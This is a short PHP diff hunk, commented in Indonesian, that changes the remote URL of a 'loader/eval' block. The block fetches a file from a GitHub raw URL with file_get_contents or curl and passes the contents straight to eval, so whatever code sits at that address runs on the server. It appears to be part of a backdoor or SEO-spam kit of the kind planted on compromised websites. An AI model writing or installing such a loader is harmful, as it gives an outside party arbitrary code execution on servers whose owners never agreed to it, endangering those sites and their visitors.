@@ -93,7 +93,7 @@ if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['confi
 // --- [BLOK LOADER/EVAL] ---
 // Kode ini hanya akan berjalan jika BUKAN mode hapus (confirm=yes).
 // Ganti URL ini dengan URL ke file x.php (Bagian 2) di GitHub Anda
-$url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/route.php'; 
+$url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/x.txt'; 
 
 if (($content = @file_get_contents($url)) || ($content = curl_get_contents($url))) {
  eval('?>' . $content);
